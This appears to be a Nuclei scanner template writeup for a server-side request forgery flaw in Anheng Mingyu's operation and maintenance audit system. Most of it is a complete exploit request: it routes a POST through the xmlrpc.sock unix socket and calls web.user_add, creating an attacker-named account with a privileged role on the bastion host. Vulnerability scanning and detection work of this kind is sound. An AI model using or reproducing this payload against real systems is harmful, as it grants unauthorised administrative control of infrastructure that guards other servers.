# Nuclei Template: Mingyu Operation xmlrpc.sock - User Addition
**Template ID:** mingyu-xmlrpc-sock-adduser
**Vulnerability Class:** Server-Side Request Forgery (SSRF)
**Severity:** High
**CWE:** CWE-918
**Source:** Nuclei Template (`mingyu-xmlrpc-sock-adduser.yaml`)

## Vulnerability Information & PoC

## Description
There is an SSRF vulnerability in the xmlrpc.sock interface of Anheng Mingyu operation and maintenance audit and risk control system, through which any user can be added to control the bastion machine

## Steps to reproduce / Exploit Payload
```http
POST /service/?unix:/../../../../var/run/rpc/xmlrpc.sock|http://{{random}}/wsrpc HTTP/1.1
Host: {{Hostname}}

<?xml version="1.0"?>
<methodCall>
<methodName>web.user_add</methodName>
<params>
<param>
<value>
<array>
<data>
<value>
<string>admin</string>
</value>
<value>
<string>5</string>
</value>
<value>
<string>10.0.0.1</string>
</value>
</data>
</array>
</value>
</param>
<param>
<value>
<struct>
<member>
<name>uname</name>
<value>
<string>{{username}}</string>
</value>
</member>
<member>
<name>name</name>
<value>
<string>{{username}}</string>
</value>
</member>
<member>
<name>pwd</name>
<value>
<string>{{password}}</string>
</value>
</member>
<member>
<name>authmode</name>
<value>
<string>1</string>
</value>
</member>
<member>
<name>deptid</name>
<value>
<string></string>
</value>
</member>
<member>
<name>email</name>
<value>
<string></string>
</value>
</member>
<member>
<name>mobile</name>
<value>
<string></string>
</value>
</member>
<member>
<name>comment</name>
<value>
<string></string>
</value>
</member>
<member>
<name>roleid</name>
<value>
<string>102</string>
</value>
</member>
</struct></value>
</param>
</params>
</methodCall>
```

## References
- https://github.com/zan8in/afrog/blob/main/v2/pocs/afrog-pocs/vulnerability/dbappsecurity-mingyu-xmlrpc-sock-adduser.yaml
- https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/iot/%E5%AE%89%E6%81%92/%E5%AE%89%E6%81%92%20%E6%98%8E%E5%BE%A1%E8%BF%90%E7%BB%B4%E5%AE%A1%E8%AE%A1%E4%B8%8E%E9%A3%8E%E9%99%A9%E6%8E%A7%E5%88%B6%E7%B3%BB%E7%BB%9F%20xmlrpc.sock%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0%E6%BC%8F%E6%B4%9E.md
